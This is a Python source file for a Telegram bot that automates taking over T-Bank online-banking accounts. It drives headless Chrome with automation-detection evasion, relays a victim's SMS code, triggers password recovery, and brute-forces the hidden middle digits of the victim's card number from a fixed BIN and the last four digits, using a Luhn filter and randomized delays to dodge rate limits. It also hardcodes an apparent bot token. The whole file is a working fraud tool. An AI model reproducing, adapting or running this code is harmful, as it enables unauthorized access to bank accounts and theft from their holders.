import logging
import threading
import time
import random
import asyncio
from enum import Enum
from typing import Dict, Optional
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.common.action_chains import ActionChains
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.common.exceptions import TimeoutException, NoSuchElementException
from selenium.webdriver.chrome.service import Service
from telegram import Update, Bot
from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes, ConversationHandler

# Enable logging
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.INFO
)
logger = logging.getLogger(__name__)

# Define states for conversation
class State(Enum):
    WAITING_PHONE = 1
    WAITING_SMS = 2
    WAITING_LAST4 = 3
    BRUTE_FORCE = 4

# User session data structure
class UserSession:
    def __init__(self, user_id: int):
        self.user_id = user_id
        self.state = State.WAITING_PHONE
        self.phone = ""
        self.driver = None
        self.last4 = ""
        self.bin = "220070"
        self.current_candidate = 0
        self.found_card = None
        self.brute_force_thread = None
        self.stop_brute_force = False
        self.last_sms_time = 0  # Время последней отправки SMS

# Store user sessions
user_sessions: Dict[int, UserSession] = {}

# Telegram Bot Token (replace with your token)
TOKEN = "8163066452:AAGc_n0x--A0xtmCdVwp5NGZLsCi5qFC0_I"

# T-Bank URLs
MAIN_URL = "https://www.tbank.ru/"

# Luhn algorithm implementation
def luhn_check_15(s: str) -> int:
    """Calculate Luhn check digit for 15-digit string"""
    s_rev = s[::-1]
    total = 0
    for i, char in enumerate(s_rev):
        digit = int(char)
        if i % 2 == 0:
            doubled = digit * 2
            total += doubled // 10 + doubled % 10
        else:
            total += digit
    return (10 - (total % 10)) % 10

def human_delay(min_sec=0.3, max_sec=1.5):
    """Random delay to simulate human behavior"""
    time.sleep(random.uniform(min_sec, max_sec))

def human_type(element, text):
    """Type text with random delays between keystrokes"""
    for char in text:
        element.send_keys(char)
        time.sleep(random.uniform(0.05, 0.2))

async def start_browser_session(session: UserSession, bot):
    """Start a headless Chrome browser session"""
    try:
        await bot.send_message(chat_id=session.user_id, text="🔄 Запускаю браузер...")
        options = webdriver.ChromeOptions()
        options.add_argument('--headless=new')
        options.add_argument('--no-sandbox')
        options.add_argument('--disable-dev-shm-usage')
        options.add_argument('--disable-blink-features=AutomationControlled')
        options.add_argument('--disable-gpu')
        options.add_argument('--window-size=1920,1080')
        options.add_argument('--user-agent=Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36')
        options.add_experimental_option("excludeSwitches", ["enable-automation"])
        options.add_experimental_option('useAutomationExtension', False)
        options.binary_location = '/usr/bin/google-chrome-stable'
        
        session.driver = webdriver.Chrome(options=options)
        
        # Execute CDP commands to further hide automation
        session.driver.execute_cdp_cmd('Network.setUserAgentOverride', {
            "userAgent": 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
        })
        session.driver.execute_script("Object.defineProperty(navigator, 'webdriver', {get: () => undefined})")
        
        # Navigate to main page
        await bot.send_message(chat_id=session.user_id, text="🌐 Открываю главную страницу T-Bank...")
        session.driver.get(MAIN_URL)
        logger.info(f"Loaded main page: {session.driver.current_url}")
        human_delay(3, 5)
        
        # Try to navigate via menu, fallback to direct URL
        await bot.send_message(chat_id=session.user_id, text="🔍 Ищу вход в Интернет-банк...")
        menu_success = False
        try:
            # Try to find login link and get its href
            selectors = [
                (By.XPATH, "//a[contains(@href, 'id.tbank.ru') or contains(@href, '/login')]"),
                (By.XPATH, "//a[contains(text(), 'Интернет-банк')]"),
                (By.CSS_SELECTOR, "a[href*='id.tbank']"),
                (By.CSS_SELECTOR, "a[href='/login/']"),
            ]
            
            for by, selector in selectors:
                try:
                    login_link = WebDriverWait(session.driver, 5).until(
                        EC.presence_of_element_located((by, selector))
                    )
                    # Get href attribute
                    href = login_link.get_attribute('href')
                    if href:
                        # If relative URL, make it absolute
                        if href.startswith('/'):
                            href = 'https://www.tbank.ru' + href
                        logger.info(f"Found login link with href: {href}")
                        await bot.send_message(chat_id=session.user_id, text="✅ Перехожу на страницу входа...")
                        session.driver.get(href)
                        human_delay(3, 5)
                        menu_success = True
                        break
                except:
                    continue
            
            if not menu_success:
                logger.warning("Menu navigation failed, using direct URL")
                raise Exception("No login link found")
                
        except Exception as e:
            logger.error(f"Error navigating menu: {e}")
            # Go directly to login page
            await bot.send_message(chat_id=session.user_id, text="⚠️ Использую прямую ссылку на вход...")
            session.driver.get("https://id.tbank.ru/auth/step")
            human_delay(3, 5)
        
        logger.info(f"After navigation, current URL: {session.driver.current_url}")
    except Exception as e:
        logger.error(f"Failed to start browser: {e}")
        raise

async def enter_phone_number(session: UserSession, bot):
    """Enter phone number on T-Bank login page"""
    try:
        # Wait for page to load
        await bot.send_message(chat_id=session.user_id, text="🔎 Ищу поле для ввода номера...")
        human_delay(2, 3)
        
        # Try multiple selectors for phone input
        phone_input = None
        selectors = [
            (By.CSS_SELECTOR, "input[type='tel']"),
            (By.CSS_SELECTOR, "input[name='phone']"),
            (By.CSS_SELECTOR, "input[inputmode='tel']"),
            (By.XPATH, "//input[@type='tel' or @inputmode='tel' or @name='phone']")
        ]
        
        for by, selector in selectors:
            try:
                phone_input = WebDriverWait(session.driver, 5).until(
                    EC.presence_of_element_located((by, selector))
                )
                logger.info(f"Found phone input with selector: {selector}")
                await bot.send_message(chat_id=session.user_id, text="✅ Поле найдено, ввожу номер телефона...")
                break
            except:
                continue
        
        if not phone_input:
            logger.error(f"Phone input not found. Current URL: {session.driver.current_url}")
            logger.error(f"Page source preview: {session.driver.page_source[:500]}")
            return False
        
        human_delay(0.5, 1.5)
        # Use JavaScript to focus and clear
        session.driver.execute_script("arguments[0].scrollIntoView(true);", phone_input)
        session.driver.execute_script("arguments[0].focus();", phone_input)
        human_delay(0.3, 0.8)
        phone_input.clear()
        human_delay(0.2, 0.5)
        
        # Remove + from phone number for input
        phone_to_enter = session.phone.lstrip('+')
        human_type(phone_input, phone_to_enter)
        
        human_delay(0.5, 1.2)
        # Find and click submit button
        await bot.send_message(chat_id=session.user_id, text="➡️ Нажимаю 'Продолжить'...")
        try:
            continue_btn = session.driver.find_element(By.CSS_SELECTOR, "button[type='submit']")
        except:
            continue_btn = session.driver.find_element(By.XPATH, "//button[contains(text(), 'Продолжить') or contains(text(), 'Далее')]")
        
        session.driver.execute_script("arguments[0].click();", continue_btn)
        human_delay(2, 3)
        
        # Сохраняем время первой отправки SMS
        session.last_sms_time = time.time()
        
        return True
    except Exception as e:
        logger.error(f"Error entering phone number: {e}")
        logger.error(f"Current URL: {session.driver.current_url}")
        return False

async def enter_sms_code(session: UserSession, code: str, bot):
    """Enter SMS code on T-Bank page"""
    try:
        await bot.send_message(chat_id=session.user_id, text="🔍 Ищу поле для ввода SMS-кода...")
        
        # Updated selector for SMS code input
        code_input = WebDriverWait(session.driver, 10).until(
            EC.presence_of_element_located((By.CSS_SELECTOR, "input[automation-id='otp-input']"))
        )
        await bot.send_message(chat_id=session.user_id, text="✅ Поле найдено, ввожу SMS-код...")
        
        human_delay(0.5, 1.0)
        session.driver.execute_script("arguments[0].scrollIntoView(true);", code_input)
        session.driver.execute_script("arguments[0].focus();", code_input)
        human_delay(0.3, 0.6)
        code_input.clear()
        human_delay(0.2, 0.4)
        human_type(code_input, code)
        
        await bot.send_message(chat_id=session.user_id, text="⏳ Жду обработки кода...")
        human_delay(3, 5)
        
        # Check if password page appears or we need to click "Не помню пароль"
        await bot.send_message(chat_id=session.user_id, text="🔍 Ищу кнопку 'Не помню пароль'...")
        try:
            forgot_pass_btn = WebDriverWait(session.driver, 5).until(
                EC.presence_of_element_located((By.XPATH, "//button[contains(text(), 'Не помню пароль') or contains(text(), 'Забыли пароль')]"))
            )
            await bot.send_message(chat_id=session.user_id, text="✅ Нажимаю 'Не помню пароль'...")
            session.driver.execute_script("arguments[0].click();", forgot_pass_btn)
            human_delay(2, 3)
        except TimeoutException:
            await bot.send_message(chat_id=session.user_id, text="ℹ️ Кнопка восстановления не найдена, продолжаю...")
        
        # Wait for card number input page
        await bot.send_message(chat_id=session.user_id, text="🔍 Жду страницу ввода карты...")
        WebDriverWait(session.driver, 10).until(
            EC.presence_of_element_located((By.CSS_SELECTOR, "input[automation-id='card-input']"))
        )
        await bot.send_message(chat_id=session.user_id, text="✅ Страница ввода карты загружена!")
        return True
    except Exception as e:
        logger.error(f"Error entering SMS code: {e}")
        await bot.send_message(chat_id=session.user_id, text=f"❌ Ошибка при вводе кода: {str(e)}")
        return False

async def resend_sms_code(session: UserSession, bot):
    """Кликнуть кнопку повторной отправки SMS-кода"""
    try:
        # Проверка таймера (100 секунд)
        current_time = time.time()
        if session.last_sms_time > 0:
            time_passed = current_time - session.last_sms_time
            if time_passed < 100:
                remaining = int(100 - time_passed)
                await bot.send_message(
                    chat_id=session.user_id, 
                    text=f"⏳ Нужно подождать еще {remaining} секунд перед повторной отправкой кода."
                )
                return False
        
        await bot.send_message(chat_id=session.user_id, text="🔍 Ищу кнопку 'Отправить еще раз'...")
        
        resend_btn = WebDriverWait(session.driver, 10).until(
            EC.presence_of_element_located((By.CSS_SELECTOR, "button[automation-id='resend-button']"))
        )
        
        await bot.send_message(chat_id=session.user_id, text="✅ Нажимаю кнопку...")
        session.driver.execute_script("arguments[0].click();", resend_btn)
        human_delay(2, 3)
        
        # Обновляем время последней отправки
        session.last_sms_time = time.time()
        
        await bot.send_message(chat_id=session.user_id, text="✅ Код отправлен заново! Отправьте новый код.")
        return True
    except Exception as e:
        logger.error(f"Error resending SMS code: {e}")
        await bot.send_message(chat_id=session.user_id, text=f"❌ Ошибка при повторной отправке: {str(e)}")
        return False

def try_card_number(session: UserSession, card_number: str) -> bool:
    """Try a card number on T-Bank page and check if successful"""
    try:
        # Find card number input using updated selector
        card_input = WebDriverWait(session.driver, 10).until(
            EC.presence_of_element_located((By.CSS_SELECTOR, "input[automation-id='card-input']"))
        )
        
        human_delay(0.5, 1.0)
        session.driver.execute_script("arguments[0].scrollIntoView(true);", card_input)
        session.driver.execute_script("arguments[0].focus();", card_input)
        human_delay(0.3, 0.6)
        card_input.clear()
        human_delay(0.2, 0.4)
        
        # Format card number with spaces (0000 0000 0000 0000)
        formatted_card = ' '.join([card_number[i:i+4] for i in range(0, len(card_number), 4)])
        human_type(card_input, formatted_card)
        
        # Click continue
        human_delay(0.7, 1.5)
        try:
            continue_btn = session.driver.find_element(By.CSS_SELECTOR, "button[type='submit']")
        except:
            continue_btn = session.driver.find_element(By.XPATH, "//button[contains(text(), 'Продолжить') or contains(text(), 'Далее')]")
        
        session.driver.execute_script("arguments[0].click();", continue_btn)
        
        # Wait and check for result
        human_delay(5, 7)
        current_url = session.driver.current_url
        
        # Check if successfully logged in (URL changed from auth page)
        if "tbank.ru" in current_url and "auth" not in current_url and "id.tbank" not in current_url:
            # Additional check for account page elements
            page_source = session.driver.page_source.lower()
            if any(keyword in page_source for keyword in ["счет", "баланс", "главная", "операции", "карты"]):
                return True
        
        # Check for error message on page
        try:
            error_element = session.driver.find_element(By.XPATH, "//*[contains(text(), 'неверн') or contains(text(), 'ошибк') or contains(text(), 'не найден')]")
            return False
        except:
            pass
        
        return False
    except Exception as e:
        logger.error(f"Error trying card number {card_number}: {e}")
        return False

async def brute_force_worker(session: UserSession, app: Application):
    """Worker thread for brute-forcing card numbers"""
    try:
        for candidate in range(session.current_candidate, 1000000):
            if session.stop_brute_force:
                break
                
            candidate_str = str(candidate).zfill(6)
            first_15 = session.bin + candidate_str + session.last4[:3]
            
            # Check Luhn validation
            if luhn_check_15(first_15) == int(session.last4[3]):
                full_card = session.bin + candidate_str + session.last4
                
                # Try the card number
                if try_card_number(session, full_card):
                    session.found_card = full_card
                    session.stop_brute_force = True
                    
                    # Send success message
                    await app.bot.send_message(
                        chat_id=session.user_id,
                        text=f"✅ Успех! Найдена карта: {full_card}"
                    )
                    
                    # Close browser
                    if session.driver:
                        session.driver.quit()
                    return
            
            # Update progress every 5000 candidates
            if candidate % 5000 == 0:
                progress = (candidate / 1000000) * 100
                await app.bot.send_message(
                    chat_id=session.user_id,
                    text=f"⏳ Прогресс: {progress:.1f}% (проверено {candidate} комбинаций)"
                )
            
            human_delay(1, 3)  # Wait between attempts to avoid rate limiting
            
            session.current_candidate = candidate + 1
        
        # If loop completes without finding
        await app.bot.send_message(
            chat_id=session.user_id,
            text="❌ Не удалось найти подходящую карту. Попробуйте с другими данными."
        )
        
    except Exception as e:
        logger.error(f"Error in brute force worker: {e}")
        await app.bot.send_message(
            chat_id=session.user_id,
            text=f"❌ Ошибка в процессе подбора: {str(e)}"
        )
    finally:
        # Cleanup
        if session.driver:
            session.driver.quit()
        if session.user_id in user_sessions:
            del user_sessions[session.user_id]

# Telegram bot handlers
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    """Start the conversation and ask for phone number"""
    user_id = update.effective_user.id
    
    if user_id in user_sessions:
        await update.message.reply_text("❌ У вас уже есть активная сессия. Закончите текущую.")
        return ConversationHandler.END
    
    session = UserSession(user_id)
    user_sessions[user_id] = session
    
    await update.message.reply_text(
        "👋 Добро пожаловать! Отправьте номер телефона в формате +79999999999\n\n"
        "⬅️ /back - вернуться назад\n"
        "❌ /cancel - отменить"
    )
    return State.WAITING_PHONE.value

async def receive_phone(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    """Receive phone number and start browser session"""
    user_id = update.effective_user.id
    if user_id not in user_sessions:
        await update.message.reply_text("❌ Сессия не найдена. Начните с /start")
        return ConversationHandler.END
    
    session = user_sessions[user_id]
    phone = update.message.text.strip()
    
    # Validate phone number format
    if not phone.startswith('+7') or len(phone) != 12:
        await update.message.reply_text("❌ Неверный формат номера. Используйте +79999999999")
        return State.WAITING_PHONE.value
    
    session.phone = phone
    
    # Start browser session
    await update.message.reply_text("🔄 Запускаю браузер...")
    try:
        await start_browser_session(session, context.application.bot)
        if await enter_phone_number(session, context.application.bot):
            await update.message.reply_text(
                "✅ Номер введен. Теперь отправьте SMS код, который пришел на телефон:\n\n"
                "🔁 /resend - отправить код повторно\n"
                "⬅️ /back - вернуться назад"
            )
            session.state = State.WAITING_SMS
            return State.WAITING_SMS.value
        else:
            await update.message.reply_text("❌ Ошибка при вводе номера. Попробуйте еще раз.")
            return State.WAITING_PHONE.value
    except Exception as e:
        logger.error(f"Error starting browser: {e}")
        await update.message.reply_text(f"❌ Ошибка: {str(e)}")
        return ConversationHandler.END

async def receive_sms(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    """Receive SMS code and proceed to card entry"""
    user_id = update.effective_user.id
    if user_id not in user_sessions:
        await update.message.reply_text("❌ Сессия не найдена. Начните с /start")
        return ConversationHandler.END
    
    session = user_sessions[user_id]
    sms_code = update.message.text.strip()
    
    # Проверка на команду resend
    if sms_code.lower() == 'resend' or sms_code == '/resend':
        await resend_sms_code(session, context.application.bot)
        return State.WAITING_SMS.value
    
    # Validate SMS code
    if not sms_code.isdigit() or len(sms_code) != 4:
        await update.message.reply_text("❌ Неверный формат кода. Отправьте 4 цифры или /resend.")
        return State.WAITING_SMS.value
    
    await update.message.reply_text("🔄 Ввожу код...")
    try:
        if await enter_sms_code(session, sms_code, context.application.bot):
            await update.message.reply_text(
                "✅ Код принят. Теперь отправьте последние 4 цифры карты:\n\n"
                "⬅️ /back - вернуться назад"
            )
            session.state = State.WAITING_LAST4
            return State.WAITING_LAST4.value
        else:
            await update.message.reply_text("❌ Ошибка при вводе кода. Попробуйте еще раз.")
            return State.WAITING_SMS.value
    except Exception as e:
        logger.error(f"Error entering SMS: {e}")
        await update.message.reply_text(f"❌ Ошибка: {str(e)}")
        return ConversationHandler.END

async def receive_last4(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    """Receive last 4 digits and start brute force"""
    user_id = update.effective_user.id
    if user_id not in user_sessions:
        await update.message.reply_text("❌ Сессия не найдена. Начните с /start")
        return ConversationHandler.END
    
    session = user_sessions[user_id]
    last4 = update.message.text.strip()
    
    # Validate last 4 digits
    if not last4.isdigit() or len(last4) != 4:
        await update.message.reply_text("❌ Неверный формат. Отправьте 4 цифры.")
        return State.WAITING_LAST4.value
    
    session.last4 = last4
    
    await update.message.reply_text(
        f"🔍 Начинаю подбор карты с последними цифрами {last4}...\n"
        f"Это займет некоторое время (примерно 10 минут)."
    )
    
    # Start brute force as async task
    session.brute_force_thread = asyncio.create_task(
        brute_force_worker(session, context.application)
    )
    
    session.state = State.BRUTE_FORCE
    return State.BRUTE_FORCE.value

async def cancel(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    """Cancel the current operation"""
    user_id = update.effective_user.id
    if user_id in user_sessions:
        session = user_sessions[user_id]
        session.stop_brute_force = True
        
        if session.driver:
            session.driver.quit()
        
        del user_sessions[user_id]
    
    await update.message.reply_text("❌ Операция отменена.")
    return ConversationHandler.END

async def back(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    """Go back to previous step or restart"""
    user_id = update.effective_user.id
    
    if user_id in user_sessions:
        session = user_sessions[user_id]
        session.stop_brute_force = True
        
        if session.driver:
            try:
                session.driver.quit()
            except:
                pass
        
        del user_sessions[user_id]
    
    await update.message.reply_text(
        "⬅️ Возврат назад. Сессия сброшена.\n\n"
        "👉 Нажмите /start чтобы начать заново."
    )
    return ConversationHandler.END

async def error_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle errors"""
    logger.error(f"Update {update} caused error {context.error}")
    if update and update.effective_message:
        await update.effective_message.reply_text("❌ Произошла ошибка. Попробуйте еще раз.")

async def brute_force_status(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    """Show status during brute force"""
    await update.message.reply_text("⏳ Идет подбор карты...")
    return State.BRUTE_FORCE.value

def main():
    """Start the bot"""
    app = Application.builder().token(TOKEN).build()
    
    # Create conversation handler
    conv_handler = ConversationHandler(
        entry_points=[CommandHandler('start', start)],
        states={
            State.WAITING_PHONE.value: [
                MessageHandler(filters.TEXT & ~filters.COMMAND, receive_phone)
            ],
            State.WAITING_SMS.value: [
                MessageHandler(filters.TEXT & ~filters.COMMAND, receive_sms)
            ],
            State.WAITING_LAST4.value: [
                MessageHandler(filters.TEXT & ~filters.COMMAND, receive_last4)
            ],
            State.BRUTE_FORCE.value: [
                MessageHandler(filters.TEXT & ~filters.COMMAND, brute_force_status)
            ],
        },
        fallbacks=[
            CommandHandler('cancel', cancel),
            CommandHandler('back', back),
        ],
    )
    
    app.add_handler(conv_handler)
    app.add_error_handler(error_handler)
    
    # Start the Bot
    app.run_polling()

if __name__ == '__main__':
    main()